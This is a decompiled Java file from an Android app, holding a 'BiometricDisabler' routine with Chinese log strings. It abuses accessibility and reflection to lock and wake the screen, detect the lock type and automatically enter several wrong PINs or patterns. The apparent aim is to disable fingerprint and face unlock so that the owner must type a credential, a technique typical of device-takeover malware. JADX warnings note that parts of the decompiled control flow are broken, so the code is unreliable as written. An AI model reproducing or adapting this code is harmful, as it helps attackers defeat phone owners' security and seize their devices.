package com.storm.safe.rock.service.modules;

import com.storm.safe.rock.util.ReflectApi;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import okhttp3.internal.p032ws.WebSocketProtocol;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.BiometricDisabler$disableBiometric$1", m214403f = "BiometricDisabler.kt", m214404l = {116, 122, WebSocketProtocol.PAYLOAD_SHORT, 136, 140, 146}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class BiometricDisabler$disableBiometric$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52739a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0317a2 f52740a2;

    /* renamed from: a3 */
    public final /* synthetic */ uz0 f52741a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public BiometricDisabler$disableBiometric$1(C0317a2 c0317a2, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52740a2 = c0317a2;
        this.f52741a3 = uz0Var;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new BiometricDisabler$disableBiometric$1(this.f52740a2, this.f52741a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((BiometricDisabler$disableBiometric$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:66:0x013b, code lost:
    
        if (com.storm.safe.rock.service.modules.C0317a2.m211551a2(r0, r16) == r4) goto L67;
     */
    /* JADX WARN: Removed duplicated region for block: B:24:0x006a  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x0084  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00c5 A[Catch: all -> 0x0022, Exception -> 0x0025, TryCatch #1 {Exception -> 0x0025, blocks: (B:6:0x001d, B:68:0x013e, B:11:0x0028, B:54:0x00e8, B:59:0x0102, B:62:0x011a, B:65:0x012c, B:12:0x002d, B:51:0x00da, B:13:0x0032, B:48:0x00c5, B:16:0x003e, B:18:0x0053, B:20:0x005f, B:23:0x0065, B:26:0x006d, B:28:0x0079, B:31:0x007f, B:34:0x0087, B:38:0x009a, B:45:0x00b9, B:44:0x00b4), top: B:75:0x0012, outer: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00d9  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00da A[Catch: all -> 0x0022, Exception -> 0x0025, TryCatch #1 {Exception -> 0x0025, blocks: (B:6:0x001d, B:68:0x013e, B:11:0x0028, B:54:0x00e8, B:59:0x0102, B:62:0x011a, B:65:0x012c, B:12:0x002d, B:51:0x00da, B:13:0x0032, B:48:0x00c5, B:16:0x003e, B:18:0x0053, B:20:0x005f, B:23:0x0065, B:26:0x006d, B:28:0x0079, B:31:0x007f, B:34:0x0087, B:38:0x009a, B:45:0x00b9, B:44:0x00b4), top: B:75:0x0012, outer: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:53:0x00e7  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x00e8 A[Catch: all -> 0x0022, Exception -> 0x0025, TryCatch #1 {Exception -> 0x0025, blocks: (B:6:0x001d, B:68:0x013e, B:11:0x0028, B:54:0x00e8, B:59:0x0102, B:62:0x011a, B:65:0x012c, B:12:0x002d, B:51:0x00da, B:13:0x0032, B:48:0x00c5, B:16:0x003e, B:18:0x0053, B:20:0x005f, B:23:0x0065, B:26:0x006d, B:28:0x0079, B:31:0x007f, B:34:0x0087, B:38:0x009a, B:45:0x00b9, B:44:0x00b4), top: B:75:0x0012, outer: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00fd  */
    /* JADX WARN: Removed duplicated region for block: B:65:0x012c A[Catch: all -> 0x0022, Exception -> 0x0025, TryCatch #1 {Exception -> 0x0025, blocks: (B:6:0x001d, B:68:0x013e, B:11:0x0028, B:54:0x00e8, B:59:0x0102, B:62:0x011a, B:65:0x012c, B:12:0x002d, B:51:0x00da, B:13:0x0032, B:48:0x00c5, B:16:0x003e, B:18:0x0053, B:20:0x005f, B:23:0x0065, B:26:0x006d, B:28:0x0079, B:31:0x007f, B:34:0x0087, B:38:0x009a, B:45:0x00b9, B:44:0x00b4), top: B:75:0x0012, outer: #0 }] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        int iOrdinal;
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        try {
            try {
            } catch (Exception e) {
                t60.m214705c6("BiometricDisabler", "❌ 禁用生物识别失败", e);
                this.f52741a3.m214872a8("执行失败: " + e.getMessage());
            }
            switch (this.f52739a1) {
                case 0:
                    kg1.m213544f4(obj);
                    this.f52740a2.f53044a3 = true;
                    this.f52741a3.m214873a9(1, "开始禁用生物识别");
                    ReflectApi reflectApi = ReflectApi.INSTANCE;
                    Object systemService = reflectApi.getSystemService(this.f52740a2.f53042a1, "keyguard");
                    if (systemService != null) {
                        Object objCallMethod = reflectApi.callMethod(systemService, "isKeyguardLocked", new Object[0]);
                        Boolean bool = objCallMethod instanceof Boolean ? (Boolean) objCallMethod : null;
                        boolean zBooleanValue = bool != null ? bool.booleanValue() : false;
                        if (systemService != null) {
                            Object objCallMethod2 = reflectApi.callMethod(systemService, "isKeyguardSecure", new Object[0]);
                            Boolean bool2 = objCallMethod2 instanceof Boolean ? (Boolean) objCallMethod2 : null;
                            boolean zBooleanValue2 = bool2 != null ? bool2.booleanValue() : false;
                            if (!zBooleanValue2) {
                                t60.m214726f4("BiometricDisabler", "⚠️ 设备未设置安全锁屏（PIN/密码/图案），无法执行");
                                this.f52741a3.m214872a8("设备未设置安全锁屏");
                                this.f52740a2.f53044a3 = false;
                                return c1351vv;
                            }
                            if (!zBooleanValue) {
                                this.f52741a3.m214873a9(2, "锁定设备");
                                try {
                                    if (!this.f52740a2.f53041a0.performGlobalAction(8)) {
                                        t60.m214726f4("BiometricDisabler", "⚠️ 锁定设备失败");
                                    }
                                } catch (Exception e2) {
                                    t60.m214705c6("BiometricDisabler", "锁定设备失败", e2);
                                }
                                this.f52739a1 = 1;
                                if (b81.m210571b1(2000L, this) != coroutineSingletons) {
                                    this.f52741a3.m214873a9(3, "唤醒屏幕");
                                    C0317a2.m211553a4(this.f52740a2);
                                    this.f52739a1 = 2;
                                    if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                                        C0317a2.m211552a3(this.f52740a2);
                                        this.f52739a1 = 3;
                                        if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                                            this.f52741a3.m214873a9(4, "检测锁屏类型");
                                            iOrdinal = C0317a2.m211549a0(this.f52740a2).ordinal();
                                            if (iOrdinal != 0) {
                                                this.f52741a3.m214873a9(5, "执行PIN禁用 (共6次)");
                                                C0317a2 c0317a2 = this.f52740a2;
                                                this.f52739a1 = 5;
                                                break;
                                            } else if (iOrdinal != 1) {
                                                if (iOrdinal == 2) {
                                                    t60.m214726f4("BiometricDisabler", "⚠️ 无法确定锁屏类型，尝试PIN方式");
                                                    this.f52741a3.m214873a9(5, "尝试PIN禁用");
                                                    C0317a2 c0317a22 = this.f52740a2;
                                                    this.f52739a1 = 6;
                                                    if (C0317a2.m211551a2(c0317a22, this) == coroutineSingletons) {
                                                    }
                                                }
                                                this.f52741a3.m214873a9(6, "生物识别已禁用");
                                                this.f52741a3.m214874b0();
                                            } else {
                                                this.f52741a3.m214873a9(5, "执行图案锁禁用 (共13次)");
                                                C0317a2 c0317a23 = this.f52740a2;
                                                this.f52739a1 = 4;
                                                if (C0317a2.m211550a1(c0317a23, this) == coroutineSingletons) {
                                                }
                                                this.f52741a3.m214873a9(6, "生物识别已禁用");
                                                this.f52741a3.m214874b0();
                                            }
                                        }
                                    }
                                }
                                return coroutineSingletons;
                            }
                        }
                    }
                    this.f52740a2.f53044a3 = false;
                    return c1351vv;
                case 1:
                    kg1.m213544f4(obj);
                    this.f52741a3.m214873a9(3, "唤醒屏幕");
                    C0317a2.m211553a4(this.f52740a2);
                    this.f52739a1 = 2;
                    if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                case 2:
                    kg1.m213544f4(obj);
                    C0317a2.m211552a3(this.f52740a2);
                    this.f52739a1 = 3;
                    if (b81.m210571b1(1000L, this) == coroutineSingletons) {
                    }
                    return coroutineSingletons;
                case 3:
                    kg1.m213544f4(obj);
                    this.f52741a3.m214873a9(4, "检测锁屏类型");
                    iOrdinal = C0317a2.m211549a0(this.f52740a2).ordinal();
                    if (iOrdinal != 0) {
                    }
                    this.f52740a2.f53044a3 = false;
                    return c1351vv;
                case 4:
                case 5:
                case 6:
                    kg1.m213544f4(obj);
                    this.f52741a3.m214873a9(6, "生物识别已禁用");
                    this.f52741a3.m214874b0();
                    this.f52740a2.f53044a3 = false;
                    return c1351vv;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Throwable th) {
            this.f52740a2.f53044a3 = false;
            throw th;
        }
    }
}
